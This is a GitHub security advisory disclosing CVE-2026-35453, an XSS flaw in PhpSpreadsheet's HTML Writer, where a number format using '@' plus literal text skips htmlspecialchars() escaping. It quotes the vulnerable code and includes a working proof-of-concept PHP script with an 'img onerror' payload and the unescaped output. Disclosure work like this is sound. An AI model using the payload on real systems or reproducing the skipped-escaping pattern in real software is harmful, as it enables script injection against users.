# [M] PhpSpreadsheet has XSS via NumberFormat @ Text Substitution in HTML Writer

## Summary
Severity: Medium
Advisory: GHSA-6wpp-88cp-7q68
CVE: CVE-2026-35453
CWE: CWE-79, CWE-80
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-28
Source: https://github.com/advisories/GHSA-6wpp-88cp-7q68
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=4.0.0 <5.7.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=3.3.0 <3.10.5
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.4.5
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.16
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.30.4

## Details
### Summary
The HTML Writer in PhpSpreadsheet bypasses `htmlspecialchars()` output escaping when a cell uses a custom number format containing the `@` text placeholder with additional literal text (e.g., `@ "items"` or `"Total: "@`). This allows an attacker to inject arbitrary HTML and JavaScript into the generated HTML output by crafting a malicious XLSX file.

### Details


#### 1. Conditional escaping in `Html.php:1586-1594`

```php
$cellData = NumberFormat::toFormattedString(
    $origData2,
    $formatCode ?? NumberFormat::FORMAT_GENERAL,
    [$this, 'formatColor']
);

if ($cellData === $origData) {
    $cellData = htmlspecialchars($cellData, Settings::htmlEntityFlags());
}
```

`htmlspecialchars()` is only called when `$cellData === $origData` (strict comparison). If the formatted output differs from the original value in any way, escaping is skipped entirely.

#### 2. Early return in `Formatter.php:136-152`

```php
if (preg_match(self::SECTION_SPLIT, $format) === 0
    && preg_match(self::SYMBOL_AT, $formatx) === 1) {
    if (!str_contains($format, '"')) {
        return str_replace('@', /* raw value */, $format);
    }
    return str_replace(/* ... preg_replace with raw value ... */);
}
```

When the format code contains `@` with additional literal text (e.g., `@ "items"`), the formatter substitutes the raw cell value into the format string and **returns early** — the `formatColor` callback (which would have applied `htmlspecialchars`) is never invoked.


### PoC

**test.php**
``` php
<?php

require '/app/vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Html;

$spreadsheet = new Spreadsheet();
$sheet = $spreadsheet->getActiveSheet();

$payload    = '<img src=x onerror=alert(document.domain)>';
$formatCode = '@ "items"';


$sheet->setCellValue('A1', $payload);
$sheet->getStyle('A1')->getNumberFormat()->setFormatCode($formatCode);

$writer = new Html($spreadsheet);
$html = $writer->generateHTMLAll();

file_put_contents('/app/output.html', $html);

echo "HTML output saved to /app/output.html\n";
```

The produced output contains unescaped data.
``` html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <meta name="generator" content="PhpSpreadsheet, https://github.com/PHPOffice/PhpSpreadsheet" />
      <title>Untitled Spreadsheet</title>
      <meta name="author" content="Unknown Creator" />
      <meta name="title" content="Untitled Spreadsheet" />
      <meta name="lastModifiedBy" content="Unknown Creator" />
      <meta name="created" content="2026-04-02T16:34:44+00:00" />
      <meta name="modified" content="2026-04-02T16:34:44+00:00" />
    <style type="text/css">
[..SNIP..]
    </style>
  </head>

  <body>
<div style='page: page0'>
    <table border='0' cellpadding='0' cellspacing='0' id='sheet0' class='sheet0 gridlines'>
        <col class="col0" />
        <tbody>
          <tr class="row0">
            <td class="column0 style1 s"><img src=x onerror=alert(document.domain)> items</td>
          </tr>
    </tbody></table>
</div>
  </body>
</html>
```

<img width="719" height="716" alt="Screenshot 2026-04-02 at 18 45 53" src="https://github.com/user-attachments/assets/b758b063-a2d1-4e76-87bb-931eae81dbfe" />



### Impact

The impact changes based on the way the HTML is served. 
In case it is served from the web server it is typical XSS, in case the file is downloaded and opened locally, the attack vector is more limited.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6wpp-88cp-7q68
- https://nvd.nist.gov/vuln/detail/CVE-2026-35453
- https://github.com/PHPOffice/PhpSpreadsheet
